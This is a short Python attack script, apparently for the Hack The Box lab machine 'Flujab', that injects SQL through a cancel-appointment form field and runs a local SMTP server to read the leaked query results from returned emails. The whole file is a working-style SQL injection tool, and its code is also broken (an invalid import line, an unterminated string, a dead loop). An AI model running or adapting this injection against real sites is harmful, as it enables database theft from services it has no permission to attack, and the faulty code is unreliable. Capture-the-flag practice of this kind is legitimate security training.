from smtpd import SMTPServer
import asyncore
import threading
import re
import cmd from Cmd
import requests


#ippsec flujab
#sql injection from a http email form, this run a SMTP server and show message directly.



class Terminal(cmd):
	prompt = "cmd =>"
	
	def inject(self, args):
		payload = f"' {args}-- -"
		data = { 'nhsnum': payload, 'submit':"Cancel Appointment"}
		cookies = {}
		r = requests.post('https://freeflujab.htb/?cancel', data=data, cookies=cookies, verify=False)
		
	def default(self,args):
		self.inject(args)
		
class EmailServer(SMTPServer):
	def process_message(self, peer, mailfrom, rcptos, data, **kwargs):
		response = str(data, 'utf-8)
		data = re.findall(r'- Ref:(.*)', response)[0] #find the part where the sqli data is
		print(data)
		print()
		
def mail():
	EmailServer(('0.0.0.0',25), None)
	asyncore.loop()
	
threads = []
t = threading.Thread(target=mail)
threads.append(t)
t.start()

requests.packages.urllib3.disable_warnings()
term = Terminal()
term.cmdloop()


while True:
	cmd = input("cmd => ")
	print(cmd)
